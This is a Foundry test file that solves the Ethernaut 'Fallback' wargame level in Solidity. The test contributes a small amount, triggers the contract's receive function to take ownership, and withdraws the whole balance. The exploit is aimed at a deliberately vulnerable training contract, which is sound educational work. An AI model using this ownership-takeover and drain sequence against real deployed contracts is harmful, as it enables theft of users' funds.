// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../../src/ethernaut-001-fallback/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fallback_contract;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        fallback_contract = new Fallback();
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // contribute
        fallback_contract.contribute{value: 0.0000001 ether}();
        assertGt(fallback_contract.getContribution(), 0, "Contribution failed");

        // call receive function
        (bool success,) = address(fallback_contract).call{value: 0.0000001 ether}("");
        assertEq(fallback_contract.owner(), attacker, "Owner not changed");

        // withdraw
        fallback_contract.withdraw();
        assertEq(address(fallback_contract).balance, 0, "Withdraw failed");

        vm.stopPrank();
    }
}
